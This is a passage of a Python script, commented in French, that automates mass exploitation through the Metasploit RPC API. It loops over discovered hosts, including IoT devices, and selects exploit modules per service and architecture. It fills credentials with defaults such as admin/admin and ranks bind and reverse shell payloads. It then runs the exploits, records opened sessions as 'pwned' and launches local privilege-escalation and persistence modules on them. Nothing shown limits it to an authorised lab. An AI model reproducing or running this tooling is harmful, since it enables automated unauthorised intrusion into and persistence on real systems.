    else:
        print("[WARN] LHOST non défini, listener non démarré")

    while True:

     debug_hosts = get_all_debug_hosts()
     if not debug_hosts:
        print("[INFO] Aucun hôte bm12_v3 disponible — retry dans 60s.")
        time.sleep(60)
        continue
     print(f"[DEBUG] {len(debug_hosts)} hôte(s) bm12_v3 à traiter.")
     debug_index = 0
     upgraded_sessions = set()
     min_date = "2000-01-01"
     console_id = client.consoles.console().cid
     console = client.consoles.console(console_id)
     host_id, host, scan_details_raw = debug_hosts[debug_index]
     debug_index += 1
     scan_details = json.loads(scan_details_raw) if isinstance(scan_details_raw, str) else (scan_details_raw or {})
     products = scan_details.get('products', [])
     print(f"[DEBUG] Cible {debug_index}/{len(debug_hosts)} : {host} | produits: {[p['name'] for p in products]}")
     services = get_host_services_by_address(str(host))
     if not services:
         print(f"[DEBUG] Aucun service connu pour {host} — skip.")
         continue
     print(f"[DEBUG] {len(services)} services: {[(p, s) for p, s, *_ in services]}")
     os_name = get_host_os(str(host)) or 'Linux'
     # Forcer le type bm12 si classifié (iot_embedded, vuln_web)
     host_type = scan_details.get('type', '')
     if host_type == 'iot_embedded':
         os_name = 'iot_embedded'
     elif host_type == 'vuln_web':
         os_name = 'vuln_web'
     host_arch = get_host_arch(str(host)) or scan_details.get('arch', '')
     print(f"[INFO] OS: {os_name} | Type: {host_type or 'n/a'} | Arch: {host_arch or 'unknown'}")
     if scan_details.get('attack_surface'):
         print(f"[INFO] Attack surface: {[v['vuln'] for v in scan_details['attack_surface']]}")
     search_results = build_targeted_exploits(client, services, os_name, products=products, scan_details=scan_details)

     if not host:
         print("[INFO] Aucun hôte disponible.")
         return

     open_ports = {port for port, *_ in services} if services else set()
     print(f"[INFO] Scan de {host} en cours... ports ouverts: {sorted(open_ports)}")

     run_start = time.time()
     stats = {'tried': 0, 'check_failed': 0, 'missing': 0, 'samba': 0, 'pwned': [], 'post_tried': 0}

     # Séparer exploits remote (Phase 1) et post-exploitation (Phase 2)
     _POST_PATHS = ('exploit/linux/local/', 'exploit/linux/persistence/')
     remote_exploits = [m for m in search_results if not any(m.get('fullname', '').startswith(p) for p in _POST_PATHS)]
     post_exploits   = [m for m in search_results if any(m.get('fullname', '').startswith(p) for p in _POST_PATHS)]
     print(f"[INFO] Phase 1: {len(remote_exploits)} remote | Phase 2: {len(post_exploits)} post-exploitation")

     def _rank(p):
         if 'interact' in p: return 0
         if p.startswith('cmd/unix/') and 'bind' in p and 'netcat' in p: return 1
         if p.startswith('cmd/unix/') and 'bind' in p and 'perl' in p: return 2
         # Priorité ARM/MIPS quand la cible est ARM/MIPS
         is_arm  = 'arm'  in (host_arch or '')
         is_mips = 'mips' in (host_arch or '')
         if is_arm  and p.startswith('linux/arm')  and 'bind' in p: return 3
         if is_mips and p.startswith('linux/mips') and 'bind' in p: return 3
         if is_arm  and p.startswith('linux/arm'): return 4
         if is_mips and p.startswith('linux/mips'): return 4
         if p == 'linux/x86/shell_bind_tcp': return 5
         if p == 'linux/x64/shell_bind_tcp': return 5
         if p.startswith('cmd/unix/') and 'bind' in p: return 6
         if p.startswith('cmd/unix/') and 'reverse' in p and 'netcat' in p: return 7
         if p.startswith('cmd/unix/') and 'reverse' in p: return 8
         if 'bind' in p: return 9
         return 10

     def _run_exploit_list(exploit_list, phase_session_id=None):
         """
         Exécute une liste d'exploits MSF.
         phase_session_id : si défini (Phase 2), SESSION est pré-rempli avec cet ID.
         """
         check_con = client.consoles.console()
         for mod in exploit_list:
             if mod['type'] != 'exploit':
                 print('+', end="")
                 continue
             if mod['disclosuredate'] < min_date:
                 print('+', end="")
                 continue
             if 'samba' in mod['fullname']:
                 print(f"[DEBUG] Skip samba: {mod['fullname']}")
                 stats['samba'] += 1
                 continue

             try:
                 _fullname = mod['fullname']
                 _modname = _fullname[len('exploit/'):] if _fullname.startswith('exploit/') else _fullname
                 exploit = client.modules.use('exploit', _modname)
             except Exception:
                 print("erreur dans les resultats")
                 continue

             exploit.target = 0

             # Phase 2 : injecter SESSION en premier
             if phase_session_id is not None:
                 try:
                     exploit['SESSION'] = phase_session_id
                 except Exception:
                     pass

             try:
                 rport = exploit.runoptions.get('RPORT')
                 if rport is not None and open_ports:
                     if int(rport) not in open_ports:
                         continue
                     exploit['RPORT'] = int(rport)
             except (TypeError, ValueError):
                 pass

             payload = exploit.targetpayloads()
             missing = exploit.missing_required
             if len(missing) > 0:
                 active_sessions = client.sessions.list
                 for field in missing:
                     match field:
                         case "RHOSTS":
                             try:
                                 addr = ipaddress.ip_address(str(host).split("/")[0])
                                 rhosts_val = f"[{host}]" if addr.version == 6 else str(host)
                             except ValueError:
                                 rhosts_val = str(host)
                             exploit[field] = rhosts_val
                         case "TARGET_PATH":
                             exploit[field] = "/"
                         case "SESSION":
                             if active_sessions:
                                 exploit[field] = int(next(iter(active_sessions)))
                             else:
                                 # Pas de session disponible — sera traité en Phase 2
                                 stats['missing'] += 1
                                 break
                         case "LHOST":
                             exploit[field] = LHOST
                         case "RPORT":
                             if open_ports:
                                 exploit[field] = next(iter(sorted(open_ports)))
                             else:
                                 print(f"[SKIP] RPORT requis mais aucun port ouvert connu")
                         case "PASSWORD" | "PASS" | "SMBPass" | "FTP_PASS":
                             exploit[field] = ""
                         case "TARGETURI":
                             exploit[field] = "/"
                         case "USERNAME" | "HttpUsername" | "FTPUSER" | "SSH_USER":
                             exploit[field] = "admin"
                         case "HttpPassword" | "FTPPASS":
                             exploit[field] = "admin"
                         case "VHOST":
                             exploit[field] = str(host).split("/")[0]
                         case _:
                             print(f"Pas traite {field}")

             if exploit.missing_required:
                 print(f"[SKIP] Champs manquants : {exploit.missing_required} — {mod['fullname']}")
                 stats['missing'] += 1
                 continue
             print(f"missing résolus : {mod['fullname']}")

             if not check_target(check_con, mod['fullname'],
                                 exploit.runoptions.get('RHOSTS'), exploit.runoptions.get('RPORT')):
                 print(f"[CHECK] Non vulnérable — skip")
                 stats['check_failed'] += 1
                 continue

             payload = [p for p in payload if p.startswith('linux/') or p.startswith('cmd/unix/')]
             payload = sorted(payload, key=_rank)[:5]
             if len(payload) > 0 and MODE_RUN == 1:
                 for p in payload:
                     if phase_session_id is not None:
                         stats['post_tried'] += 1
                     else:
                         stats['tried'] += 1
                     sessions_before = set(client.sessions.list.keys())
                     print(f"{mod['fullname']} payload {p}", end='')
                     try:
                         payload_obj = client.modules.use('payload', p)
                         if 'reverse' in p:
                             try:
                                 payload_obj['LHOST'] = LHOST
                             except KeyError:
                                 pass
                             # Utiliser le multi/handler existant — évite le conflit sur port 4444
                             try:
                                 exploit['DisablePayloadHandler'] = True
                             except Exception:
                                 pass
                         else:
                             try:
                                 exploit['DisablePayloadHandler'] = False
                             except Exception:
                                 pass
                         if 'reverse' in p or 'bind' in p:
                             try:
                                 payload_obj['LPORT'] = LPORT_BIND if 'bind' in p else LPORT
                             except KeyError:
                                 pass
                         output = console.run_module_with_output(exploit, payload_obj, timeout=30)
                         # Tuer les jobs MSF résiduels pour libérer la console
                         try:
                             console.write("jobs -K\n")
                             time.sleep(1)
                             console.read()
                         except Exception:
                             pass
                         short = (output or '').strip().replace('\n', ' ')[:150]
                         print(f": Ok [{short}]")
                     except Exception as e:
                         print(f": {type(e).__name__}: {e}")
                         continue
                     while console.is_busy():
                         print("+", end="")
                         time.sleep(1)
                     # Polling session — laisser le temps à MSF d'établir la connexion
                     for _ in range(6):
                         sessions_now = client.sessions.list
                         new_sessions = set(sessions_now.keys()) - sessions_before
                         if new_sessions:
                             break
                         time.sleep(2)
                     else:
                         sessions_now = client.sessions.list
                         new_sessions = set(sessions_now.keys()) - sessions_before
                     if new_sessions:
                         handle_new_sessions(client, sessions_now, upgraded_sessions, host)
                         stats['pwned'].append((mod['fullname'], p))
                         print(f"[PWN] {mod['fullname']} → sessions {sorted(new_sessions)}")
                         report_vuln(str(host), mod['fullname'], p, sorted(new_sessions)[0])
                         break  # session ouverte — inutile d'essayer d'autres payloads
         check_con.destroy()

     # Phase 1 : exploits remote (accès initial)
     print(f"\n[PHASE 1] Exploits remote sur {host}")
     _run_exploit_list(remote_exploits)

     # Phase 2 : post-exploitation si au moins une session active
     sessions_after_p1 = client.sessions.list
     if sessions_after_p1 and post_exploits:
         sid_p2 = int(next(iter(sessions_after_p1)))
         print(f"\n[PHASE 2] {len(post_exploits)} exploits post-exploitation (session #{sid_p2})")
         _run_exploit_list(post_exploits, phase_session_id=sid_p2)
     elif post_exploits:
         print(f"[PHASE 2] Skippée — aucune session obtenue en Phase 1")

     elapsed = int(time.time() - run_start)
     sessions_final = client.sessions.list
     print(f"\n{'='*60}")
     print(f"[RAPPORT] Cible : {host}  |  Durée : {elapsed}s")
     print(f"  Exploits remote testés : {stats['tried']}")
     print(f"  Post-exploitation      : {stats['post_tried']}")
     print(f"  Check non-vuln         : {stats['check_failed']}")
     print(f"  Champs manquants       : {stats['missing']}")
     print(f"  Samba skippés          : {stats['samba']}")
     print(f"  Vecteurs confirmés     : {len(stats['pwned'])}")
     print(f"  Sessions actives       : {len(sessions_final)}  {list(sessions_final.keys())}")
     if stats['pwned']:
         print(f"  Vecteurs gagnants  :")
         for exploit_name, payload_name in stats['pwned']:
             print(f"    ✓ {exploit_name}  [{payload_name}]")
     else:
         print(f"  Vecteurs gagnants  : aucun")
     # Fermer toutes les sessions proprement
     for sid in list(sessions_final.keys()):
         try:
             client.sessions.session(sid).stop()
             print(f"  [CLOSE] Session {sid} fermée.")
         except Exception as e:
             print(f"  [CLOSE] Session {sid} erreur: {e}")
     upgraded_sessions.clear()
     print(f"{'='*60}\n")


